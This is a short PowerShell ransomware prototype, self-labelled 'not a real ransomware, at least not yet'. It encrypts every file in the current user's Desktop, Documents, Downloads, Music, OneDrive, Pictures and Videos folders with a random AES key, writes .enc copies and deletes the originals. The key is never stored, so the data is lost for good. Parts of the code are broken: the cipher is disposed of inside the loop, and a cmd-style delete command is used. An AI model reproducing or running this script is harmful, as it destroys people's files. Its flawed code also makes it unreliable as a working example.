###########################
## NOT A REAL RANSOMWARE ##
###########################
# At least not yet


##################
## CRYPTO STUFF ##
##################
#NOTE Create a Key and IV:
$RNG = New-Object System.Security.Cryptography.RNGCryptoServiceProvider

$AESEncryptionKey     = [System.Byte[]]::new(32) #NOTE: 32 Bytes (256-bit Key)
$RNG.GetBytes($AESEncryptionKey)

$InitializationVector = [System.Byte[]]::new(16) #NOTE: 16 Bytes (128-bit IV)
$RNG.GetBytes($InitializationVector)

#NOTE: Create a AES Crypto Provider:
$AESCipher = New-Object System.Security.Cryptography.AesCryptoServiceProvider

#NOTE: Add the Key and IV to the Cipher
$AESCipher.Key        = $AESEncryptionKey
$AESCipher.IV         = $InitializationVector


#########################
## SET USER/FILES VARS ##
#########################
#Get the username and set path
$username = $env:username
$path = "C:\Users\$username"
$libraries = "Desktop","Documents","Downloads","Music","OneDrive","Pictures","Videos"

Foreach ($library in $libraries){
#Get files from path recursively
#$files = Get-ChildItem -Path "$path\$library\*" -Force -Recurse -Include *.txt, *.docx, *.xlsx, *.pptx, *.ppsx, *.png, *.tiff, *.jpg, *.jpeg, *.wav, *.mp3
$files = Get-ChildItem -Path "$path\$library\*" -Recurse -Exclude desktop.ini

###################
## ENCRYPT FILES ##
###################
Foreach ($file in $files){

#NOTE: Get the file content
$MySecretText         = Get-Content -Raw "$file"

#NOTE: Encrypt data with AES:
$UnencryptedBytes     = [System.Text.Encoding]::UTF8.GetBytes($MySecretText)
$Encryptor            = $AESCipher.CreateEncryptor()
$EncryptedBytes       = $Encryptor.TransformFinalBlock($UnencryptedBytes, 0, $UnencryptedBytes.Length)

#NOTE: Save the IV information with the data:
[byte[]] $FullData    = $AESCipher.IV + $EncryptedBytes

#NOTE: Transforms the data to string format
$CipherText           = [System.Convert]::ToBase64String($FullData)

#NOTE: Cleanup the Cipher and KeyGenerator
$AESCipher.Dispose()
$RNG.Dispose()

#NOTE: Put encrypted content into new file and delete original file
$CipherText | Out-File "$file.enc"
del /q /s "$file"
}

}
